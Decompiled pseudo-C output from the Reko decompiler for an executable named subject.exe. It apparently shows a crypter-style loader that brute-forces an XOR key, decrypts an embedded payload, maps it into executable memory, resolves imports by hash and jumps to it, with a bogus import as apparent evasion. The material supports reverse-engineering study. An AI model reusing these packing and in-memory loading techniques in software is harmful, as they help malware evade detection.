// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw407000 = 0xC502; // 00407000
word32 g_dw407004 = 0xC511; // 00407004
word32 g_dw407008 = 0xC522; // 00407008
word32 g_dw40700C = 0xC52E; // 0040700C
word32 g_dw407010 = 0xC53D; // 00407010
word32 g_dw407014 = 0xC550; // 00407014
word32 g_dw407018 = 0xC55F; // 00407018
word32 g_dw40701C = 50541; // 0040701C
word32 g_dw407020 = 50556; // 00407020
word32 g_dw407024 = 50573; // 00407024
word32 g_dw407028 = 0xC5A5; // 00407028
word32 g_dw40702C = 50609; // 0040702C
word32 g_dw407030 = 0xC5C4; // 00407030
word32 g_dw407034 = 50651; // 00407034
word32 g_dw407038 = 50669; // 00407038
word32 g_dw40703C = 0xC605; // 0040703C
word32 g_dw407040 = 0xC616; // 00407040
word32 g_dw407044 = 0xC621; // 00407044
word32 g_dw407048 = 50745; // 00407048
word32 g_dw40704C = 50760; // 0040704C
word32 g_dw407050 = 50779; // 00407050
word32 g_dw407054 = 0xC668; // 00407054
word32 g_dw407058 = 50810; // 00407058
word32 g_dw40705C = 0xC690; // 0040705C
word32 g_dw407064 = 50857; // 00407064
word32 g_dw407068 = 50868; // 00407068
word32 g_dw40706C = 50877; // 0040706C
word32 g_dw407070 = 0xC6CA; // 00407070
word32 g_dw407074 = 50899; // 00407074
word32 g_dw407078 = 0xC6DC; // 00407078
word32 g_dw40707C = 50925; // 0040707C
word32 g_dw407080 = 0xC6FA; // 00407080
word32 g_dw407084 = 0xC705; // 00407084
word32 g_dw407088 = 0xC70D; // 00407088
word32 g_dw40708C = 50970; // 0040708C
word32 g_dw407090 = 0xC726; // 00407090
word32 g_dw407094 = 50991; // 00407094
word32 g_dw407098 = 0xC73C; // 00407098
word32 g_dw40709C = 51016; // 0040709C
word32 g_dw4070A0 = 0xC750; // 004070A0
word32 g_dw4070A4 = 51035; // 004070A4
word32 g_dw4070A8 = 0xC768; // 004070A8
word32 g_dw4070B0 = 0xC780; // 004070B0
word32 g_dw4070B4 = 0xC78C; // 004070B4
word32 g_dw4070B8 = 51100; // 004070B8
word32 g_dw4070BC = 51115; // 004070BC
word32 g_dw4070C0 = 51130; // 004070C0
word32 g_dw4070C4 = 0xC7CD; // 004070C4
word32 g_dw4070C8 = 51163; // 004070C8
word32 g_dw4070CC = 51181; // 004070CC
word32 g_dw4070D0 = 0xC7FC; // 004070D0
word32 g_dw4070D4 = 0xC80E; // 004070D4
word32 g_dw4070D8 = 51229; // 004070D8
word32 g_dw4070E0 = 51254; // 004070E0
word32 g_dw4070E4 = 0xC848; // 004070E4
word32 g_dw4070E8 = 0xC860; // 004070E8
word32 g_dw4070EC = 0xC870; // 004070EC
word32 g_dw4070F0 = 0xC87F; // 004070F0
word32 g_dw4070F4 = 0xC893; // 004070F4
word32 g_dw4070F8 = 0xC8A7; // 004070F8
word32 g_dw4070FC = 0xC8BA; // 004070FC
word32 g_dw407100 = 0xC8CD; // 00407100
word32 g_dw407104 = 0xC8E4; // 00407104
word32 g_dw407108 = 51443; // 00407108
word32 g_dw407110 = 0xC90F; // 00407110
word32 g_dw407114 = 51485; // 00407114
word32 g_dw407118 = 51502; // 00407118
word32 g_dw40711C = 51516; // 0040711C
word32 g_dw407120 = 0xC94C; // 00407120
word32 g_dw407124 = 51551; // 00407124
word32 g_dw407128 = 0xC970; // 00407128
word32 g_dw40712C = 51586; // 0040712C
word32 g_dw407130 = 0xC992; // 00407130
word32 g_dw407134 = 51617; // 00407134
word32 g_dw407138 = 0xC9AC; // 00407138
word32 g_dw40713C = 0xC9BA; // 0040713C
word32 g_dw407140 = 0xC9CA; // 00407140
word32 g_dw407144 = 51675; // 00407144
word32 g_dw407148 = 51686; // 00407148
word32 g_dw40714C = 51700; // 0040714C
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register ui32 fn00401000()
// Called from:
//      fn004013AE
//      fn00401AA2
ui32 fn00401000()
{
	byte SCZDOP;
	word64 edx_eax_13 = __rdtsc();
	int32 eax_15 = (word32) edx_eax_13;
	return eax_15 ^ __rol<word32,byte>(SLICE(edx_eax_13, word32, 32) *s eax_15 + SCZDOP, (byte) eax_15 & 0x0F);
}

// 00401017: Register word16 fn00401017(Stack Eq_23 dwArg04)
// Called from:
//      fn0040175F
word16 fn00401017(Eq_23 dwArg04)
{
	word32 ecx_14 = 0x00;
	size_t edi_19 = dwArg04;
	while (true)
	{
		edi_19 = (Eq_23) ((word32) edi_19 + 1);
		if (*edi_19 == 0x00)
			break;
		++ecx_14;
	}
	return (word16) ecx_14;
}

// 0040103C: Register Eq_37 Win32CrtStartup()
Eq_37 Win32CrtStartup()
{
	Eq_38 dwArg04;
	word32 dwArg0C;
	up32 dwArg08;
	word16 wArg04 = (word16) dwArg04;
	Eq_37 eax_118;
	comdlg32.dll!LoadAlterBitmap(0x00, 0x00, 0x00);
	if (dwArg0C == 0x00 && (dwArg08 < 0x04 && (word32) wArg04 == 0x00))
	{
		word32 esi_149;
		eax_118 = fn004014DC(dwArg04, dwArg08, SetErrorMode(0x02), CreateMutexW(null, 0x00, null), out esi_149);
	}
	else
	{
		Eq_37 esi_50;
		fn004014DC(null, 0x29, 0x00, null, out esi_50);
		ExitThread(esi_50);
		eax_118 = 0x1F00;
	}
	return eax_118;
}

// 004010B5: void fn004010B5(Register word32 ecx, Register (ptr32 Eq_95) edx)
// Called from:
//      fn004014DC
void fn004010B5(word32 ecx, struct Eq_95 * edx)
{
	word32 eax_8 = (&(edx + edx->ptr003C / 64)->ptr003C)[0x0F];
	if (eax_8 != 0x00)
	{
		struct Eq_106 * eax_13 = edx + eax_8 / 64;
		eax_13->dw001C += ecx;
		eax_13->dw0024 += ecx;
		eax_13->dw0020 += ecx;
		eax_13->dw000C += ecx;
		word32 edi_30[] = edx + eax_13->dw001C / 64;
		uint32 esi_31 = 0x00;
		if (eax_13->dw0014 > 0x00)
		{
			do
			{
				edi_30[esi_31] += ecx;
				uint32 v21_43 = esi_31 + 0x01;
				esi_31 = v21_43;
			} while (v21_43 < eax_13->dw0014);
		}
		word32 esi_55[] = edx + eax_13->dw0020 / 64;
		uint32 edx_56 = 0x00;
		if (eax_13->dw0018 > 0x00)
		{
			do
			{
				esi_55[edx_56] += ecx;
				++edx_56;
			} while (edx_56 < eax_13->dw0018);
		}
	}
}

// 00401123: void fn00401123(Register (ptr32 Eq_187) ebx)
// Called from:
//      fn004014DC
void fn00401123(struct Eq_187 * ebx)
{
	struct Eq_188 * ecx_13 = ebx->ptr0000;
	ebx->t0028.u0 = 0x00;
	word32 eax_19 = Mem15[Mem15[ecx_13 + 60:word32] + 16 + ecx_13:word32] + ecx_13;
	memcpy(&ebx->dw0004, eax_19 - ~0x0B, 0x24);
	int32 eax_40 = ebx->dw0004;
	ebx->dw0014 -= eax_40;
	ebx->dw001C += eax_40;
	ebx->dw000C += eax_40 *s ~0x07;
	ebx->dw0018 += eax_40 *s ~0x0F;
	ebx->dw0010 += -eax_40 * 0x02;
	Eq_192 eax_70 = VirtualAlloc(0x00, ebx->dw0010 + 36, 0x3000, 0x40);
	ebx->t0028.u0 = (LPVOID) eax_70;
	struct Eq_196 * dwLoc0C_113 = eax_19;
	Eq_192 dwLoc08_123 = eax_70;
	word32 dwLoc10_124 = 0x04;
	do
	{
		memcpy(dwLoc08_123, (char *) &dwLoc0C_113->t0008 + 4, dwLoc0C_113->t0008.u0);
		word32 v26_94 = dwLoc10_124 - 0x01;
		eax_70.u0 = (char *) eax_70.u0 + (dwLoc0C_113->t0008).u0;
		dwLoc10_124 = v26_94;
		dwLoc08_123 = eax_70;
		dwLoc0C_113 = (struct Eq_196 *) (ebx->ptr0000 + dwLoc0C_113->dw0000 / 64);
	} while (v26_94 != 0x00);
	ebx->t0028.u0 = (LPVOID) ((char *) ebx->t0028.u0 + 11);
	ebx->t0028.u0 = (LPVOID) ((char *) ebx->t0028.u0 + 25);
}

// 004011EA: Register Eq_327 fn004011EA(Stack Eq_38 dwArg04, Stack int32 dwArg08, Register out Eq_38 ecxOut, Register out (ptr32 Eq_331) ebxOut, Register out ptr32 esiOut)
// Called from:
//      fn004011EA
//      fn004017C7
Eq_327 fn004011EA(Eq_38 dwArg04, int32 dwArg08, HMODULE & ecxOut, struct Eq_331 & ebxOut, ptr32 & esiOut)
{
	ptr32 esi;
	struct Eq_331 * ebx;
	word32 dwLoc0114;
	Eq_327 eax_180;
	word32 eax_14 = Mem6[dwArg04 + 60:word32] + dwArg04;
	Eq_38 ecx_100 = dwArg04;
	word32 esi_18 = eax_14->dw0078;
	if (esi_18 == 0x00)
	{
		eax_180 = 0x00;
		goto l00401334;
	}
	word32 edi_89;
	size_t esi_28 = dwArg04 + esi_18 / 4;
	up32 eax_23 = eax_14->dw007C;
	word16 eax_35[] = Mem33[esi_28 + 36:word32] + dwArg04;
	word32 ebx_36[] = Mem27[esi_28 + 32:word32] + dwArg04;
	word32 edi_37[] = Mem31[esi_28 + 28:word32] + dwArg04;
	if (dwArg08 < 0x00)
	{
		uint32 edx_91 = (dwArg08 & 0x7FFFFFFF) - *((word32) esi_28 + 16);
		if (edx_91 >= *((word32) esi_28 + 20))
			goto l00401317;
		edi_89 = edi_37[edx_91];
	}
	else
	{
		uint32 edx_43 = 0x00;
		bool v23_209 = *((word32) esi_28 + 24) == 0x00;
		uint32 dwLoc08_222 = 0x00;
		if (*((word32) esi_28 + 24) > 0x00)
		{
			while (dwArg08 != fn0040175F(dwArg04 + ebx_36[edx_43] / 4))
			{
				uint32 v18_64 = dwLoc08_222 + 0x01;
				dwLoc08_222 = v18_64;
				if (v18_64 >= *((word32) esi_28 + 24))
					break;
				edx_43 = v18_64;
			}
			edx_43 = dwLoc08_222;
			v23_209 = dwLoc08_222 == *((word32) esi_28 + 24);
		}
		if (v23_209)
		{
l00401317:
			ecx_100 = dwArg04;
			eax_180 = 0x00;
			goto l00401332;
		}
		edi_89 = edi_37[(word32) eax_35[edx_43]];
	}
	ecx_100 = dwArg04;
	size_t edi_102 = dwArg04 + edi_89 / 4;
	if (edi_102 < (word32) esi_28 + eax_23 && edi_102 >= esi_28)
	{
		Eq_407 esi_110 = 0x00;
		if (*edi_102 != 0x2E)
		{
			do
				++esi_110;
			while (Mem97[esi_110 + edi_102:byte] != 0x2E);
		}
		memcpy(&dwLoc0114, edi_102, esi_110);
		Mem145[&dwLoc0114 + esi_110:byte] = 0x00;
		Eq_38 eax_146 = LoadLibraryA(&dwLoc0114);
		if (eax_146 == null)
			goto l00401317;
		word32 ebx_364;
		word32 esi_365;
		edi_102 = fn004011EA(eax_146, fn0040175F(esi_110 + 1 + edi_102), out ecx_100, out ebx_364, out esi_365);
	}
	eax_180 = edi_102;
l00401334:
	ecxOut = ecx_100;
	ebxOut = ebx;
	esiOut = esi;
	return eax_180;
}

// 00401339: Register word32 fn00401339(Stack (ptr32 Eq_480) dwArg04, Stack (ptr32 Eq_480) dwArg08, Stack (ptr32 Eq_480) dwArg0C, Register out (ptr32 Eq_483) esiOut)
// Called from:
//      fn00401339
//      fn004014DC
word32 fn00401339(struct Eq_480 * dwArg04, struct Eq_480 * dwArg08, struct Eq_480 * dwArg0C, struct Eq_483 & esiOut)
{
	ptr32 fp;
	word32 ebx;
	Eq_485 dwLoc08_106 = 0x00;
	struct Eq_483 ** esp_14 = fp - 0x0C;
	if (dwArg08->w000E + dwArg08->w000C != 0x00)
	{
		ptr32 esp_28 = fp - 20;
		struct Eq_505 * dwArg08_103 = &dwArg08->w000E + 3;
		do
		{
			int32 eax_36 = dwArg08_103->dw0000;
			if (eax_36 < 0x00)
			{
				struct Eq_518 * esp_49 = esp_28 - 4;
				esp_49->ptr0000 = dwArg0C;
				esp_49->dwFFFFFFFC = dwArg04 + (eax_36 & 0x7FFFFFFF) / 16;
				esp_49->ptrFFFFFFF8 = dwArg04;
				// Failed to bind call argument.
				// Please report this issue at https://github.com/uxmal/reko
				// Failed to bind call argument.
				// Please report this issue at https://github.com/uxmal/reko
				// Failed to bind call argument.
				// Please report this issue at https://github.com/uxmal/reko
				struct Eq_480 * stackArg4 = (struct Eq_480 *) <invalid>;
				struct Eq_480 * stackArg8 = (struct Eq_480 *) <invalid>;
				struct Eq_480 * stackArg12 = (struct Eq_480 *) <invalid>;
				word32 esi_140;
				fn00401339(stackArg4, stackArg8, stackArg12, out esi_140);
				esp_28 = esp_49 - 8;
			}
			else
			{
				word32 * eax_42 = dwArg04 + eax_36 / 16;
				*eax_42 = dwArg0C + *eax_42 / 16;
			}
			Eq_485 v18_70 = (word32) dwLoc08_106.u1 + 1;
			dwLoc08_106 = v18_70;
			++dwArg08_103;
		} while (v18_70 < dwArg08->w000E + dwArg08->w000C);
		word32 * esp_81 = esp_28 + 4;
		ebx = *esp_81;
		esp_14 = esp_81 + 1;
	}
	esiOut = (struct Eq_483 *) *esp_14;
	return ebx;
}

// 004013AE: void fn004013AE(Stack Eq_192 dwArg04, Stack Eq_192 dwArg08, Stack int32 dwArg10)
// Called from:
//      fn004014DC
void fn004013AE(Eq_192 dwArg04, Eq_192 dwArg08, int32 dwArg10)
{
	ptr32 fp;
	byte * edi_182 = fp - 0x010C;
	word32 ecx_185;
	for (ecx_185 = 0x0100; ecx_185 != 0x00; --ecx_185)
	{
		*edi_182 = 0x00;
		++edi_182;
	}
	Eq_192 eax_36 = VirtualAlloc(0x00, dwArg08, 0x3000, 0x40);
	if (eax_36 != 0x00)
	{
		Eq_192 ebx_102 = 0x00;
		do
		{
			byte al_49 = (byte) fn00401000();
			byte * eax_53 = fp - 0x010C + (word32) al_49;
			if (*eax_53 == (byte) ebx_102)
			{
				*eax_53 = 0x01;
				memcpy(eax_36, dwArg04, dwArg08);
				Eq_192 esi_62 = eax_36;
				Eq_192 edi_63 = eax_36;
				byte dl_69 = al_49;
				ecx_290 = dwArg08;
				do
				{
					Eq_192 ecx_290;
					edi_63->u0 = *esi_62 ^ dl_69;
					byte cl_85 = (byte) ecx_294;
					++esi_62;
					++edi_63;
					dl_69 = __rol<byte,byte>(dl_69 + cl_85, 0x03);
					ecx_290 = SEQ(SLICE(ecx_294 - 1, word24, 8), cl_85 - 0x01);
					ecx_294 = ecx_290;
				} while (ecx_294 != (void *) 1);
				ebx_102.u0 = 0x00;
			}
			Eq_192 edx_109 = dwArg08;
			Eq_192 eax_110 = eax_36;
			int32 ecx_111 = 0x3ADE6018;
			do
			{
				ecx_111 = ecx_111 *s 33 ^ (word32) (*eax_110);
				++eax_110;
				edx_109.u0 = (word32) edx_109 - 1;
			} while (edx_109 != 0x00);
		} while (ecx_111 != dwArg10);
		memcpy(dwArg04, eax_36, dwArg08);
		VirtualAlloc(ebx_102, ebx_102, 0x3000, 0x40);
		VirtualFree(eax_36, ebx_102, 0x8000);
	}
}

// 004014DC: Register word32 fn004014DC(Stack Eq_38 dwArg04, Stack up32 dwArg08, Stack Eq_57 dwArg0C, Stack Eq_58 dwArg10, Register out ptr32 esiOut)
// Called from:
//      Win32CrtStartup
word32 fn004014DC(Eq_38 dwArg04, up32 dwArg08, Eq_57 dwArg0C, Eq_58 dwArg10, ptr32 & esiOut)
{
	ptr32 fp;
	Eq_704 tLoc58;
	Eq_37 tLoc20;
	Eq_38 eax_25;
	if (dwArg10 != null)
		eax_25 = dwArg04;
	else
		eax_25 = GetModuleHandleA(0x00);
	word32 eax_424;
	struct Eq_715 * esp_423;
	tLoc58.t0000 = eax_25;
	if (dwArg10 != null && dwArg08 != 0x01)
	{
l0040173E:
		struct Eq_754 * ecx_389 = tLoc58.ptr0000;
		word32 eax_401 = Mem396[Mem392[ecx_389 + 60:word32] + 40 + ecx_389:word32] + ecx_389;
		eax_401();
		goto l00401758;
	}
	fn00401123(&tLoc58);
	Eq_192 eax_47 = tLoc58.t0010.u0;
	uint32 ecx_65 = (uint32) (int8) (eax_47 != (tLoc58.t000C).u0);
	Eq_192 eax_67 = VirtualAlloc(0x00, eax_47, 0x3000, 0x40);
	if (eax_67 == 0x00)
	{
l00401550:
		esp_423 = fp + ~0x63;
		eax_424 = 0x00;
l00401758:
		esiOut = esp_423->ptr0004;
		return eax_424;
	}
	Eq_192 dwLoc1C_469;
	Eq_192 edi_107;
	memcpy(eax_67, tLoc58.ptr0028, tLoc58.dw0010);
	fn004013AE(eax_67, tLoc58.t0010.u0, tLoc58.dw0024);
	word32 eax_101 = tLoc58.dw0010 - tLoc58.dw001C;
	tLoc58.dw0010 = eax_101;
	<anonymous> * eax_103 = (char *) eax_67.u0 + eax_101;
	if (ecx_65 != 0x00)
	{
		Eq_192 eax_115 = fn00401A31(eax_67, tLoc58.t000C.u0, eax_103);
		edi_107 = eax_115;
		dwLoc1C_469 = eax_115;
	}
	else
	{
		dwLoc1C_469 = eax_67;
		edi_107 = eax_67;
	}
	if (edi_107 == 0x00)
		goto l00401550;
	struct Eq_832 * eax_135 = tLoc58.ptr0000;
	Eq_192 ebx_137 = eax_135 + eax_135->dw003C / 64;
	word32 esi_141 = Mem130[edi_107 + 60:word32] + edi_107;
	up32 * eax_133 = (char *) edi_107.u0 + tLoc58.dw0014;
	struct Eq_853 * dwLoc18_475 = (char *) ebx_137.u0 + ((word32) (*((word32) ebx_137 + 20)) + 24);
	<unknown>* dwLoc14_476 = esi_141 + ((word32) esi_141->w0014 + 24) / 144;
	VirtualProtect(ebx_137, 0x01, 0x04, &tLoc20);
	struct Eq_879 * eax_164 = fn0040188A(edi_107, tLoc58.t0014.u0);
	struct Eq_480 * edi_175 = eax_164 - tLoc58.dw0000;
	if (dwArg10 != null)
	{
		word32 eax_180 = esi_141->dw0078;
		if (eax_180 != 0x00)
		{
			((word32) ebx_137 + 0x0078)->u0 = edi_175 + eax_180 / 16;
l0040161D:
			word32 ecx_193 = esi_141->dw0088;
			if (ecx_193 != 0x00)
			{
				((word32) ebx_137 + 0x0088)->u0 = edi_175 + ecx_193 / 16;
				word32 eax_204 = *((word32) ebx_137 + 0x0088);
				((word32) ebx_137 + 0x008C)->u0 = esi_141->dw008C;
				struct Eq_480 * eax_208 = eax_204 + tLoc58.dw0000;
				fn00401339(eax_208, eax_208, edi_175, out esi_141)->dw0050 = ~0x00 - tLoc58.dw0000;
			}
			word32 ecx_238 = eax_164 - esi_141->dw0034;
			up32 dwLoc10_496 = 0x00;
			if (*eax_133 > 0x00)
			{
				word32 * dwLoc0C_505 = eax_133 - ~0x03;
				do
				{
					word32 * eax_254 = eax_164 + *dwLoc0C_505 / 64;
					*eax_254 += ecx_238;
					up32 v34_264 = dwLoc10_496 + 0x01;
					dwLoc0C_505 -= ~0x03;
					dwLoc10_496 = v34_264;
				} while (v34_264 < *eax_133);
			}
			word32 ecx_278;
			if (fn004017C7(eax_164, out ecx_278) != 0x00)
			{
				struct Eq_997 * ebx_294;
				struct Eq_998 * esi_296;
				word32 edi_297;
				if (fn00401956(eax_164, ecx_278, eax_164, out ebx_294, out esi_296, out edi_297) != 0x00)
				{
					if (dwArg10 != null)
						fn004010B5(edi_297, tLoc58.ptr0000);
					ebx_294->dw0028 = esi_296->dw0028 + edi_297;
					cup16 ax_329 = esi_296->w0006;
					ebx_294->w0006 = ax_329;
					up32 edx_328 = 0x00;
					if (ax_329 > 0x00)
					{
						do
						{
							memcpy(dwLoc18_475, dwLoc14_476, 0x28);
							dwLoc18_475->dw000C = edi_175 + dwLoc18_475->dw000C / 16;
							dwLoc14_476 -= ~0x27;
							dwLoc18_475 -= ~0x27;
							++edx_328;
						} while (edx_328 < (word32) ebx_294->w0006);
					}
					VirtualFree(dwLoc1C_469, 0x00, 0x8000);
					goto l0040173E;
				}
			}
			goto l00401550;
		}
	}
	((word32) ebx_137 + 0x0078)->u0 = 0x00;
	((word32) ebx_137 + 0x007C)->u0 = 0x00;
	goto l0040161D;
}

// 0040175F: Register int32 fn0040175F(Register size_t edx)
// Called from:
//      fn004011EA
int32 fn0040175F(size_t edx)
{
	int32 dwLoc08_85 = 0x00;
	uint32 eax_21 = (uint32) fn00401017(edx);
	while (*edx != 0x00)
	{
		dwLoc08_85 = dwLoc08_85 *s 65599 + (word32) (*edx);
		edx = (Eq_23) ((word32) edx + 1);
	}
	if ((dwLoc08_85 & 0x80000000) != 0x00)
		dwLoc08_85 = SEQ(SLICE(dwLoc08_85, word16, 16), (word16) dwLoc08_85 ^ ((word16) eax_21 ^ 23232)) & 0x7FFFFFFF;
	return dwLoc08_85;
}

// 004017C7: Register word32 fn004017C7(Stack (ptr32 Eq_879) dwArg04, Register out ptr32 ecxOut)
// Called from:
//      fn004014DC
word32 fn004017C7(struct Eq_879 * dwArg04, ptr32 & ecxOut)
{
	ptr32 ecx;
	word32 eax_112;
	struct Eq_879 * edi_13 = dwArg04;
	word32 eax_16 = (&(dwArg04 + dwArg04->ptr003C / 64)->ptr003C)[0x0011];
	if (eax_16 == 0x00)
		eax_112 = eax_16 + 0x01;
	else
	{
		struct Eq_1123 * ebx_104 = dwArg04 + eax_16 / 64;
		int32 dwLoc0C_146 = 0x00;
		struct Eq_1127 * eax_107 = ebx_104 + 1;
		if (ebx_104[1] != 0x00)
		{
			struct Eq_1137 * esi_106 = &ebx_104->dw000C + 1;
			do
			{
				Eq_38 eax_44 = LoadLibraryA(edi_13 + eax_107->dw0000 / 64);
				if (eax_44 == (struct HINSTANCE__ *) ~0x0F)
				{
l00401886:
					eax_112 = 0x00;
					goto l0040187F;
				}
				ui32 dwLoc08_151 = 0x00;
				struct Eq_1143 * esi_57 = edi_13 + esi_106->dw0000 / 64;
				if (esi_57->dw0000 != 0x00)
				{
					struct Eq_1143 * edi_60 = esi_57;
					do
					{
						word32 esi_75;
						Eq_327 eax_71 = fn004011EA(eax_44, edi_60->dw0000, out ecx, out ebx_104, out esi_75);
						if (eax_71 == 0x00)
							goto l00401886;
						ui32 v20_90 = dwLoc08_151 + 0x01;
						edi_60->dw0000 = (word32) eax_71;
						dwLoc08_151 = v20_90;
						edi_60 = esi_75 + v20_90 * 0x04;
					} while (edi_60->dw0000 != 0x00);
					edi_13 = dwArg04;
				}
				int32 v22_100 = dwLoc0C_146 + 0x01;
				esi_106 = (struct Eq_1137 *) (ebx_104 + (v22_100 *s 0x14) / 0x0C);
				dwLoc0C_146 = v22_100;
				eax_107 = (struct Eq_1127 *) (esi_106 + 1);
			} while (esi_106[1] != 0x00);
		}
		eax_112 = 0x01;
l0040187F:
	}
	ecxOut = ecx;
	return eax_112;
}

// 0040188A: Register Eq_192 fn0040188A(Stack Eq_192 dwArg04, Stack Eq_192 dwArg08)
// Called from:
//      fn004014DC
Eq_192 fn0040188A(Eq_192 dwArg04, Eq_192 dwArg08)
{
	ptr32 fp;
	uint32 esi_16 = 0x00;
	do
	{
		Eq_192 eax_125;
		Eq_192 eax_37 = VirtualAlloc(0x00, dwArg08, 0x2000, 0x04);
		(fp - 0x0408)[esi_16].u0 = (LPVOID) eax_37;
		if (eax_37 == 0x00)
		{
			eax_125.u0 = 0x00;
			return eax_125;
		}
		uint32 v15_52 = esi_16 + 0x01;
		esi_16 = v15_52;
	} while (v15_52 < 0x0100);
	uint32 eax_64 = fn00401AA2(v15_52);
	if (v15_52 != 0x00)
	{
		do
		{
			if (esi_16 != eax_64)
				VirtualFree((fp - 0x0408)[esi_16].u0, 0x00, 0x8000);
			--esi_16;
		} while (esi_16 != 0x00);
	}
	Eq_192 ebx_105 = (fp - 0x0408)[eax_64].u0;
	eax_125 = VirtualAlloc(ebx_105, dwArg08, 0x1000, 0x04);
	if (eax_125 != 0x00)
	{
		memcpy(ebx_105, dwArg04, dwArg08);
		eax_125 = ebx_105;
	}
	return eax_125;
}

// 00401956: Register (ptr32 Eq_879) fn00401956(Register (ptr32 Eq_879) eax, Register word32 ecx, Stack (ptr32 Eq_879) dwArg04, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
// Called from:
//      fn004014DC
struct Eq_879 * fn00401956(struct Eq_879 * eax, word32 ecx, struct Eq_879 * dwArg04, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	ptr32 fp;
	Eq_37 tLoc0C;
	struct Eq_879 * eax_116;
	tLoc0C = (Eq_37) ecx;
	struct Eq_1281 * esi_22 = eax + eax->ptr003C / 64;
	tLoc0C = (Eq_37) 0x00;
	word32 * esp_100 = fp - 24;
	word32 eax_30 = esi_22 + ((word32) esi_22->w0014 + 24) / 22;
	up32 dwLoc08_166 = 0x00;
	if (esi_22->w0006 > 0x00)
	{
		struct Eq_1310 * edi_133 = eax_30 + 36;
		do
		{
			int32 ecx_36 = edi_133->dw0000;
			Eq_37 eax_37 = 0x00;
			if ((ecx_36 & 0x20000000) != 0x00)
			{
				eax_37 = (0x00 - (word32) ((ecx_36 & 0x80000000) != 0x00) & 0x20) - ~0x1F;
				goto l004019CE;
			}
			word32 * esp_51;
			if (ecx_36 < 0x00)
			{
				esp_51 = esp_100 - 4;
				*esp_51 = 0x04;
				goto l004019CD;
			}
			if ((ecx_36 & 0x40000000) != 0x00)
			{
				esp_51 = esp_100 - 4;
				*esp_51 = 0x02;
l004019CD:
				eax_37 = (Eq_37) *esp_51;
				esp_100 = esp_51 + 1;
			}
l004019CE:
			if ((ecx_36 & 0x04000000) != 0x00)
				eax_37 |= 0x0200;
			if (eax_37 != 0x00)
			{
				Eq_192 edx_93 = edi_133->dwFFFFFFE4;
				Eq_192 ecx_97 = dwArg04 + edi_133->dwFFFFFFE8 / 64;
				struct Eq_1371 * esp_101 = esp_100 - 4;
				esp_101->t0000 = &tLoc0C;
				esp_101->tFFFFFFFC = eax_37;
				esp_101->tFFFFFFF8.u0 = (LPVOID) edx_93;
				esp_101->tFFFFFFF4.u0 = (LPVOID) ecx_97;
				esp_100 = (word32 *) ((char *) &esp_101->t0000 + 4);
				if (VirtualProtect(esp_101->tFFFFFFF4.u1, esp_101->tFFFFFFF8.u0, esp_101->tFFFFFFFC, esp_101->t0000) == 0x00)
				{
					eax_116 = null;
					goto l00401A26;
				}
			}
			up32 v22_128 = dwLoc08_166 + 0x01;
			dwLoc08_166 = v22_128;
			++edi_133;
		} while (v22_128 < (word32) esi_22->w0006);
	}
	eax_116 = (struct Eq_879 *) 0x01;
l00401A26:
	struct Eq_1419 * esp_145 = esp_100 + 1;
	ptr32 edi_144 = *esp_100;
	ptr32 esi_146 = esp_145->ptr0000;
	ebxOut = esp_145->ptr0004;
	esiOut = esi_146;
	ediOut = edi_144;
	return eax_116;
}

// 00401A31: Register Eq_192 fn00401A31(Stack Eq_192 dwArg04, Stack Eq_192 dwArg08, Stack (ptr32 code) dwArg0C)
// Called from:
//      fn004014DC
Eq_192 fn00401A31(Eq_192 dwArg04, Eq_192 dwArg08, <anonymous> * dwArg0C)
{
	Eq_192 eax_104;
	Eq_192 eax_21 = VirtualAlloc(0x00, dwArg08, 0x3000, 0x40);
	Eq_192 eax_30;
	dwArg0C();
	if (eax_30 != ~0x00 && eax_30 == dwArg08)
	{
		VirtualFree(dwArg04, 0x00, 0x8000);
		eax_104 = eax_21;
	}
	else
	{
		VirtualFree(eax_21, 0x00, 0x8000);
		VirtualFree(dwArg04, 0x00, 0x8000);
		eax_104.u0 = 0x00;
	}
	return eax_104;
}

// 00401AA2: Register uint32 fn00401AA2(Stack uint32 dwArg04)
// Called from:
//      fn0040188A
uint32 fn00401AA2(uint32 dwArg04)
{
	uint32 eax_18;
	if (dwArg04 == 0x00)
		eax_18 = 0x00;
	else
		eax_18 = (uint32) ((uint64) fn00401000() % dwArg04);
	return eax_18;
}

